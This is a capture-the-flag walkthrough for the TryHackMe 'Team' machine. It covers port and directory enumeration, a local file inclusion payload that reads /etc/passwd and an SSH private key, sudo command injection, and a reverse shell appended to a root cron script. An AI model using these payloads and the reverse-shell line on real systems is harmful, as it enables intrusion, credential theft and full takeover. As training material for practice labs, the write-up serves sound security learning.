# TryHackMe: Team Walkthrough

**Box:** Team  
**Difficulty:** Easy  
**Method:** Manual Enumeration & Exploitation

---

## 1. Reconnaissance

### Port Scanning
We begin by identifying open ports and running services using `nmap`.

```bash
nmap -p- -sV -sC -T4 --min-rate=1000 <IP_ADDRESS>
```

**Results:**
*   **21/tcp (FTP):** vsftpd 3.0.5
*   **22/tcp (SSH):** OpenSSH 8.2p1 Ubuntu
*   **80/tcp (HTTP):** Apache httpd 2.4.41

### DNS Configuration
The scan reveals the hostname `team.thm` (often inferred from HTTP headers or box description). We add this to our hosts file.

```bash
echo "<IP_ADDRESS> team.thm" | sudo tee -a /etc/hosts
```

### Web Enumeration
We use `gobuster` to find hidden directories on the web server.

```bash
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Findings:**
*   `/scripts`
*   `/assets`
*   `/images`

We perform specific fuzzing on the `/scripts` directory to identify file extensions.

```bash
ffuf -w /usr/share/seclists/discovery/Web_contents/raft-small.extensions.txt -u http://team.thm/script/script.FUZZ -t 50
```

This reveals a file named `script.old`. Upon inspection, this file contains **FTP credentials**.

---

## 2. Initial Access

### FTP & Subdomain Discovery
Using the credentials found in `script.old`, we log into the FTP server.
We discover a file `new_site.txt` which mentions a development subdomain ending in `.dev`.
We also note a `robots.txt` file mentioning the user `dale`.

We add the discovered subdomain to our hosts file:
```bash
echo "<IP_ADDRESS> dev.team.thm" | sudo tee -a /etc/hosts
```

### Local File Inclusion (LFI)
Navigating to `http://dev.team.thm`, we find a link that looks suspicious: `script.php?page=teamshare.php`.
This suggests a potential **Local File Inclusion (LFI)** vulnerability. We test this by attempting to access `/etc/passwd`.

**Payload:**
```text
http://dev.team.thm/script.php?page=../../../../etc/passwd
```
*Note: If this doesn't work immediately, increment the `../` depth.*

The `/etc/passwd` file reveals two users of interest: **dale** and **gyles**.

### SSH Key Extraction
We attempt to use the LFI vulnerability to read SSH keys. Looking for typical paths (e.g., `/home/dale/.ssh/id_rsa` or backup files), we retrieve an RSA private key.

**Key Repair:**
The retrieved key was heavily formatted with `#` characters and missing newlines. We cleaned the key to restore valid PEM format (headers, footers, and 64-char line width) and set the correct permissions:

```bash
chmod 600 id_rsa
ssh -i id_rsa dale@team.thm
```

We successfully log in as **dale** and retrieve the `user.txt` flag.

---

## 3. Privilege Escalation (Dale → Gyles)

We check for sudo privileges using `sudo -l`.
```text
User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

### Script Analysis
We analyze the `/home/gyles/admin_checks` script:
```bash
#!/bin/bash
...
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
...
```
The script asks for input and stores it in the variable `$error`, then **executes that variable directly** as a command.

### Exploitation
We run the script as user `gyles` and inject `/bin/bash` when prompted.

```bash
sudo -u gyles /home/gyles/admin_checks
# When prompted "Enter 'date'...", type: /bin/bash
```
We now have a shell as **gyles**.

---

## 4. Privilege Escalation (Gyles → Root)

First, we stabilize the shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Cron Job Enumeration
We identify a cron job running `script.sh` every minute. This script, in turn, calls `main_script.sh`.
We check the permissions of `main_script.sh` and find it is writable by the group `admin` (which gyles is a part of).

### Exploitation
We modify `main_script.sh` to execute a reverse shell connecting back to our attacking machine.

**On Attacker Machine (Listener):**
```bash
nc -lnvp 4444
```

**On Target Machine (Injection):**
```bash
echo "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" >> /usr/local/bin/main_script.sh
```

We wait for the cron job to run (up to 1 minute). The listener catches the connection, granting us **root** access.

**Flag:** `root.txt` acquired.